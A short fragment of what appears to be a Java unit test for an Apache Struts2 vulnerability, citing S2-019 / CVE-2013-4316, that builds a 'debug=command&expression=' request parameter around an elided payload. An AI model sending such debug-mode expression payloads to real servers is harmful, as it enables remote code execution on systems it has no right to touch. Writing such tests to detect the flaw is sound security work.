 ...
 * @version : TestApacheS2008.java v 0.1 2016/12/16 23:34 luyb Exp $$
 */
public class TestApacheS2008 {


    //S2-019  CVE-2013-4316????
    @Test
    public void testApacheS2008() {
        try {
            ...
            payload = "debug=command&expression=" + payload;
